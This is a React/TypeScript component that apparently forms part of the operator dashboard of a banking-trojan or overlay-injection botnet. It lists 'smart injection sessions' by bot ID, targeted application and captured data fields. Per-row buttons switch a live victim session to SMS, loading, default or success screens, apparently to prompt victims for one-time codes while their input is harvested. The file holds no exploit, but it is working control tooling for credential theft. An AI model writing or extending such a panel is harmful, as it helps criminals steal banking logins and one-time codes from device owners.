import React from "react";
import {SmartInjectionSession} from "../../../Model/SmartInjectionSession";
import {Button, Modal, Space, Table, Tooltip} from "antd";
import {ColumnType} from "antd/es/table/interface";
import {updateSmartInjectionSession} from "../../../Store/SmartInjections/Actions";
import {AppState} from "../../../Store/RootReducer";
import {useTranslation} from "react-i18next";
import {DeleteOutlined} from "@ant-design/icons";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";

interface InjectProp {
    inject: SmartInjectionSession[],
    paginationHandler: (pageNumber: number, size: number) => void,
}

const SmartInjectTable: React.FC<InjectProp> = (props: InjectProp) => {
    const dispatch = useAppDispatch();
    const {t} = useTranslation();

    const injectDelete = () => {
        alert("injectDelete");
    };

    const smartInjectionsReducer = useAppSelector((state: AppState) => state.smartInjections);

    const isLoaded = smartInjectionsReducer.isLoaded &&
        smartInjectionsReducer.page === smartInjectionsReducer.loaded_page &&
        smartInjectionsReducer.loaded_per_page === smartInjectionsReducer.per_page;

    const checkInjectionStatus = (is_closed: boolean) => {
        return (
            <Tooltip title="Сам цвет задашь">
                <i className="fa-solid fa-circle-xmark" style={{color: is_closed ? "#aa2c2c" : "#2caa31"}} />
            </Tooltip>
        );
    };

    const columns: ColumnType<SmartInjectionSession>[] = [
        {
            title: "# ID",
            dataIndex: "id",
            key: "id",
            render: (value: string, injection: SmartInjectionSession) => (
                <>
                    <Space>
                        <div className="bot-id">{injection.id}</div>
                        <div className="bot-status">
                            {checkInjectionStatus(injection.is_closed)}
                        </div>
                    </Space>
                    <div>
                        <a>{injection.bot_id}</a>
                    </div>
                </>
            ),
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-terminal" /> {t("APPLICATION")}
                </>
            ),
            dataIndex: "application",
            key: "application",
            render: (app: string) => (
                <Space>
                    <div className="app-icon" style={{width: 16, height: 16, backgroundColor: "rgba(180,180,180, 0.5)"}} />
                    {app}
                </Space>
            ),
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-list" /> {t("DATA")}
                </>
            ),
            dataIndex: "data",
            key: "data",
            render: (data: object) => {
                return data && Object.keys(data).map((value: string, key: number) => {
                    return (
                        <div className="data-render" key={key}>
                            <b>[{value}]</b> {value[key]}
                        </div>
                    );
                });
            },
        },
        {
            title: (
                <>
                    <i className="fa-solid fa-clock" /> {t("CREATED_AT")}
                </>
            ),
            dataIndex: "created_at",
            key: "created_at",
            render: (value: string, injection) => (
                <>
                    <Space size={5}>
                        <i className="fa-solid fa-clock" /> {injection.created_at}
                    </Space>
                    <Space size={5}>
                        <i className="fa-solid fa-refresh" /> {injection.updated_at}
                    </Space>

                </>
            ),
        },
        {
            title: null,
            dataIndex: "remove",
            key: "remove",
            width: 70,
            render: () => (
                <Button
                    danger
                    type="primary"
                    shape="circle"
                    icon={(
                        <span role="img" className="anticon">
                            <i className="fa-solid fa-trash-arrow-up" style={{fontSize: 16}} />
                        </span>
                    )}
                    onClick={() => {
                        Modal.confirm({
                            title: t("BOT_ACTION_DELETE_CONFIRM"),
                            content: t("ACTION_UNDONE"),
                            icon: <DeleteOutlined />,
                            onOk: injectDelete,
                            okButtonProps: {
                                danger: true,
                            },
                            okText: t("BOT_ACTION_DELETE_CONFIRM"),
                            cancelText: t("MODAL_BUTTON_CANCEL"),
                        });
                    }}
                />
            ),
        },
    ];

    const expandableRender = {
        expandedRowKeys: smartInjectionsReducer.sessions.map((item) => item.id),
        expandedRowRender: (record: any) => (
            <Space>
                <Button
                    type="primary"
                    icon={(
                        <span role="img" className="anticon">
                            <i className="fa-solid fa-envelope" style={{fontSize: 16}} />
                        </span>
                    )}
                    onClick={() => dispatch(updateSmartInjectionSession(record.id, "sms"))}
                    block
                    disabled={record.action === "default"}
                >
                    SMS
                </Button>

                <Button
                    type="primary"
                    icon={(
                        <span role="img" className="anticon">
                            <i className="fa-solid fa-refresh" style={{fontSize: 16}} />
                        </span>
                    )}
                    onClick={() => dispatch(updateSmartInjectionSession(record.id, "loading"))}
                    block
                    disabled={record.action === "default"}
                >
                    Loading
                </Button>

                <Button
                    type="primary"
                    icon={(
                        <span role="img" className="anticon">
                            <i className="fa-solid fa-circle" style={{fontSize: 16}} />
                        </span>
                    )}
                    onClick={() => dispatch(updateSmartInjectionSession(record.id, "default"))}
                    block
                    disabled={record.action === "default"}
                >
                    Default
                </Button>

                <Button
                    type="primary"
                    icon={(
                        <span role="img" className="anticon">
                            <i className="fa-solid fa-check" style={{fontSize: 16}} />
                        </span>
                    )}
                    onClick={() => dispatch(updateSmartInjectionSession(record.id, "success"))}
                    block
                    disabled={record.action === "default"}
                >
                    Success
                </Button>
            </Space>
        ),
    };

    return (
        <div className="panel-content">
            <Table
                defaultExpandAllRows={true}
                expandable={expandableRender}
                columns={columns}
                dataSource={smartInjectionsReducer.sessions}
                size="large"
                rowKey="id"
                tableLayout="fixed"
                locale={{
                    emptyText: (
                        <Space>
                            <i className="fa-solid fa-robot" /> {t("TABLE_EMPTY")}
                        </Space>
                    ),
                }}
                pagination={{
                    current: smartInjectionsReducer.page,
                    total: smartInjectionsReducer.total,
                    defaultPageSize: smartInjectionsReducer.per_page,
                    onChange: props.paginationHandler,
                    position: ["topLeft", "bottomLeft"],
                    showSizeChanger: true,
                    locale: {
                        items_per_page: "",
                    },
                }}
                loading={!isLoaded}
            />
        </div>
    );
};

export default SmartInjectTable;
